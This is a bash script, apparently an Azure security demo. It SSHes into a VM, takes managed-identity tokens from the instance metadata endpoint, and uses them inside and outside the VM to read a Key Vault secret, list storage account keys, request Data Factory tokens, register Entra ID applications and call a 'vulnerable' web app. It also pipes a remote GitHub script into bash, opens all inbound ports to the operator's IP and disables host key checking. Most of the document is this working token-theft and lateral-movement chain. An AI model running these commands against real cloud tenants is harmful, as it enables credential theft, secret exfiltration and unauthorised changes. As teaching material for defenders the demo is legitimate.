# Set the Azure Subscription context to use "microsoft azure sponsorship" 
az account set --subscription "microsoft azure sponsorship"

# Define the path to your JSON file containing the pre-provisioning information 
jsonFilePath="vmdemos/vmE2E/preprov.json"

vulnerableWebApp=https://faugnotexists.azurewebsites.net/accessToken  

# Use jq to parse the JSON file and extract the VM name, location, and storage account name and ID
vm=$(jq -r '.[] | select(.type == "Microsoft.Compute/virtualMachines") | .name' "$jsonFilePath")
location=$(jq -r '.[] | select(.type == "Microsoft.Compute/virtualMachines") | .location' "$jsonFilePath")
storageAcc=$(jq -r '.[] | select(.type == "Microsoft.Storage/storageAccounts") | .name' "$jsonFilePath")
storageId=$(jq -r '.[] | select(.type == "Microsoft.Storage/storageAccounts") | .id' "$jsonFilePath")
kvName=eastdemokv

# Construct the resource group name by prefixing 'rg-' to the VM name
vmRg="rg-$vm"

# Define a fixed resource group name
rg="rg-honeyP"

# Retrieve the public IP address of the current machine using curl
MY_IP_ADDRESS=$(curl -s ifconfig.me)/32

# Create a network security group rule to allow traffic from the current machine's IP
az network nsg rule create --name "allow-my-ip" --nsg-name tempNSG --resource-group $vmRg --priority 100 --source-address-prefixes $MY_IP_ADDRESS --destination-address-prefixes '*' --access Allow --protocol "*" --direction Inbound --destination-port-ranges '*'

# Construct the URL to access the storage account keys API
storagePath=https://management.azure.com$(echo $storageId)"/listKeys?api-version=2022-09-01"

# Retrieve details about the specified VM
vmOut=$(az vm show --resource-group $vmRg --name $vm)

# Get the public IP address of the specified VM
ip=$(az vm list-ip-addresses -g $vmRg -n $vm --query " [].virtualMachine.network.publicIpAddresses [*].ipAddress" -o tsv)

# SSH into the VM, disable strict host key checking, and install updates and jq
ssh -i tempkeys/tempkey azureuser@$ip -o StrictHostKeyChecking=no 'sudo apt update -y; sudo apt install jq -y'

# SSH into the VM, obtain an access token from the Azure Instance Metadata Service, and use it to read a secret from Azure Key Vault
ssh -i tempkeys/tempkey azureuser@$ip "at=\$(curl -s 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fvault.azure.net' -H Metadata:true | jq .access_token | sed 's/\"//g'); curl -s 'https://eastdemokv.vault.azure.net/secrets/vmsecret/?api-version=2016-10-01' -H \"Authorization: Bearer \$at\" | jq ."

# SSH into the VM, obtain an access token, and use it to list the storage account keys
ssh -i tempkeys/tempkey azureuser@$ip "at=\$(curl -s 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com' -H Metadata:true | jq .access_token | sed 's/\"//g'); curl -s -d "{}" '$storagePath' -H \"Authorization: Bearer \$at\" | jq ."

# SSH into the VM, obtain an access token, and use it to create a new Azure AD application with a random displayName
ssh -i tempkeys/tempkey azureuser@$ip "at=\$(curl -s 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fgraph.microsoft.com' -H Metadata:true | jq .access_token | sed 's/\"//g'); curl -s -X POST -H 'Content-Type: application/json' -H \"Authorization: Bearer \$at\" -d \"{\\\"displayName\\\": \\\"app-\$RANDOM\\\"}\" 'https://graph.microsoft.com/v1.0/applications' | jq ."

# SSH into the VM and execute a script from a GitHub repository, passing the storage account name as an argument
ssh -i tempkeys/tempkey azureuser@$ip "curl -s -o- https://raw.githubusercontent.com/jsa2/sessions/Azure_security_ug/BlobWriter.sh | bash -s -- \"$storageAcc\""


# Do stuff outside VM


# KeyVault
at=$(ssh -i tempkeys/tempkey azureuser@$ip "curl -s 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fvault.azure.net' -H Metadata:true" | jq .access_token | sed 's/\"//g') 

node decodeTokens.js $at

curl -s "https://$kvName.vault.azure.net/secrets/vmsecret/?api-version=2016-10-01" -H "Authorization: Bearer $at" | jq .


#Storage

at2=$(ssh -i tempkeys/tempkey azureuser@$ip "curl -s 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com' -H Metadata:true" | jq .access_token | sed 's/\"//g') 

node decodeTokens.js $at2

# Try to access storageAccount 

curl -s -d "{}" $storagePath -H "Authorization: Bearer $at2" | jq .

# Try to get Azure Data Factory DataPlane Access Tokens

curl -s -d "{}" "https://management.azure.com/subscriptions/3539c2a2-cd25-48c6-b295-14e59334ef1c/resourcegroups/rg-adf/providers/Microsoft.DataFactory/factories/adftest334/getDataPlaneAccess?api-version=2018-06-01" -H "Authorization: Bearer $at2" | jq .

# Access Graph
at3=$(ssh -i tempkeys/tempkey azureuser@$ip "curl -s 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com' -H Metadata:true" | jq .access_token | sed 's/\"//g') 

node decodeTokens.js $at3

curl -s -X POST -H "Content-type: application/json" -H "Authorization: Bearer $at3" -d '{"displayName": "'eastDemo-$RANDOM'"}' https://graph.microsoft.com/v1.0/applications | jq .

# Access Azurewebsites
at4=$(ssh -i tempkeys/tempkey azureuser@$ip "curl -s 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=979d6131-3bd0-41c5-b761-477fb1abdd4b' -H Metadata:true" | jq .access_token | sed 's/\"//g') 

node decodeTokens.js $at4

curl -s -H "Content-type: application/json" -H "Authorization: Bearer $at4" $vulnerableWebApp

#